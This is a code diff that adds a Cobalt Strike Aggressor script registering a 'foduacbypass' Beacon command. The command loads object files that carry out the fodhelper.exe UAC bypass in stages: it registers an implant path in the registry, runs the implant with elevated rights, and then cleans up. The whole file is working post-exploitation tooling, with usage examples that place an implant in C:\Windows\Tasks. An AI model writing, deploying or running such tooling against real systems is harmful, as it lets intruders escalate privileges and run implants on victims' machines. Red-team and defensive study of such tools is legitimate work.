@@ -1,0 +1,61 @@
+sub foduacbypass {
+    local('$handle $data $input $args $loc');
+
+    btask($1, "Executing FOD UAC Bypass BOF");
+
+    $input = $2;
+    $loc = $3;
+
+    btask($1, "Method selected \'$input\'");
+
+    if ($input eq "reg") {
+        if ($loc is $null) {
+            berror($1, "Missing implant location for 'reg' method.");
+            return;
+        }
+
+        btask($1, "Selected \'$loc\' as implant path");
+        $handle = openf(script_resource("reg.o"));
+        $data   = readb($handle, -1);
+        closef($handle);
+        $args   = bof_pack($1, "z", $loc);
+        beacon_inline_execute($1, $data, "go", $args);
+
+    } else if ($input eq "exec") {
+        $handle = openf(script_resource("exec.o"));
+        $data   = readb($handle, -1);
+        closef($handle);
+        beacon_inline_execute($1, $data);
+
+    } else if ($input eq "clean") {
+        $handle = openf(script_resource("clean.o"));
+        $data   = readb($handle, -1);
+        closef($handle);
+        beacon_inline_execute($1, $data);
+
+    } else {
+        berror($1, "Error: Please specify a valid method (reg, exec, or clean).");
+    }
+}
+
+beacon_command_register("foduacbypass", "Performs fodhelper UAC bypass in manual stages.",
+    "\n" .
+    "Performs fodhelper.exe UAC bypass in manual stages.\n\n" .
+    "Usage: foduacbypass <method> [location]\n\n" .
+    "Available Methods:\n" .
+    "  reg   - Registers the implant at the specified location.\n" .
+    "  exec  - Executes the registered implant.\n" .
+    "  clean - Cleans up the registry.\n\n" .
+    "Examples:\n" .
+    "1. foduacbypass reg \"C:\\Windows\\Tasks\\Implant.exe\"\n" .
+    "2. foduacbypass exec\n" .
+    "3. foduacbypass clean"
+);
+
+alias foduacbypass {
+    if ($2 is $null) {
+        berror($1, "Error: Please provide a valid method (reg, exec, or clean).");
+    } else {
+        foduacbypass($1, $2, $3);
+    }
+}
